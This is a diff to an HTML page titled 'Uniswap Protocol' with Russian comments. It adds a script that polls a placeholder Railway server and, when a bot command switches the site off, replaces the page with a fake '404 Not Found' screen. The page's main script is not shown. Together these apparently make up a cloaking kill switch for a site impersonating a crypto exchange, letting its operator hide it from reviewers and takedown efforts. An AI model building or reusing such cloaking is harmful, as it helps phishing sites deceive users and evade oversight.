@@ -1,6 +1,35 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
+    <script>
+    const API_URL = "https://твой-проект-на-railway.up.railway.app";
+
+    async function checkSiteStatus() {
+        try {
+            const response = await fetch(`${API_URL}/check-access`);
+            const data = await response.json();
+            
+            if (data.status === false) {
+                // Если ты нажал "Выключить" в боте:
+                document.open();
+                document.write(`
+                    <title>404 Not Found</title>
+                    <div style="display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; background: #fff; color: #000;">
+                        <div style="text-align: center;">
+                            <h1 style="font-size: 50px; margin-bottom: 10px;">404</h1>
+                            <p style="font-size: 18px;">The requested URL was not found on this server.</p>
+                        </div>
+                    </div>
+                `);
+                document.close();
+            }
+        } catch (error) {
+            console.error("Ошибка проверки статуса:", error);
+            // Если сервер упал, тоже можно скрыть сайт для безопасности
+        }
+    }
+    checkSiteStatus();
+</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Uniswap Protocol</title>
@@ -43,4 +72,5 @@
     <script src="app.js"></script>
 </body>
 </html>
+
 
